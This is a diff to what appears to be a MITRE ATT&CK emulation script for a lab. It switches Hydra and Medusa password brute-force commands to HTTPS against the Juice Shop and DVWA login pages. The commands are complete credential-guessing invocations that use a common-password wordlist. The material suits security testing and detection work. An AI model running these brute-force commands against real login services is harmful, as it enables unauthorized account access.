@@ -18,14 +18,14 @@ echo "  [T1110.001.a] Hydra against Juice Shop REST API:"
 echo "admin@example.com" >/tmp/mitre-users-$$.txt
 hydra -L /tmp/mitre-users-$$.txt \
   -P /opt/seclists/Passwords/Common-Credentials/best15.txt \
-  "$TARGET" http-post-form \
+  -s 443 "$TARGET" https-post-form \
   "/juice-shop/rest/user/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Invalid:H=Content-Type\: application/json" \
   -t 4 -f -I 2>&1 | grep -E "(login:|valid|host:|Hydra)" | sed -n '1,5p'
 echo ""
 
 echo "  [T1110.001.b] Medusa against DVWA:"
 medusa -h "$TARGET" -u admin -P /opt/seclists/Passwords/Common-Credentials/best15.txt \
-  -M http -m "DIR:/dvwa/login.php" -n 80 -t 4 -f 2>&1 | grep -iE "(success|found|account)" | sed -n '1,5p'
+  -M http -m "DIR:/dvwa/login.php" -n 443 -s -m USER-AGENT:Medusa/2.2 -t 4 -f 2>&1 | grep -iE "(success|found|account)" | sed -n '1,5p'
 echo ""
 
 echo "=== T1110.003: Brute Force — Password Spraying ==="
